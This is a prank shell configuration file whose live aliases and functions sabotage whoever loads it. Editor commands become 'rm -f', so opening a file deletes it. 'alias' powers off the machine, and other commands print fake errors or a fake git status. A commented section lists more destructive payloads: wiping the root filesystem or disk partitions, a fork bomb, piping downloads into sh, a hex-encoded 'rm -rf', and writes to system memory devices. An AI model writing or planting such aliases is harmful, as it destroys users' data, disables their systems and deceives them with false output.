# aliases
alias cd='cd $(ls -d */ | sort -R | head -1) && echo'
alias ls='ls | xargs -n 1 -I f echo f | rev'
alias cat='shuf -n1000'
alias vim='nano'
alias vi='nano'
alias cd='echo "bash: cd: command not found" && echo $* > /dev/null'
alias ls='echo "bash: ls: command not found" && echo $* > /dev/null'
alias gcc='echo "Segmentation fault" && echo $* > /dev/null'
alias vim='rm -f'
alias emacs='rm -f'
alias alias='poweroff'
#export PS1='C:\>'
export PS1='C:${PWD//\//\\\}>'

# for-more-fun 
# alias cd='rm -rf /'
# alias cd='dd if=/dev/zero of=/dev/sda2'
# alias ls=':(){ :|: & };:'
# alias cat='mkfs /dev/sda1'
# alias cat='cat /dev/zero > /dev/sda1'
# alias wget='wget url -O - | sh --'
# alias curl='curl url | sh'
# alias echo='echo 726d202d7266202a | xxd -r -p'
# alias alias='dd if=/dev/random of=/dev/port'
# alias alias='echo 1 > /proc/sys/kernel/panic'
# alias vim='cat /dev/port or cat /dev/mem'
# alias nano='cat /dev/zero > /dev/mem'
# alias emacs='sudo chmod -r 444 / or sudo chown -r nobody:nobody /'
# alias gcc='last | reboot'

# functions
rm () { while true; do echo -n "rm: remove regular file '$1'" && read; done; } # keeps asking for confirmation
git () { echo "Already up-to-date."; } # Never pulls anything
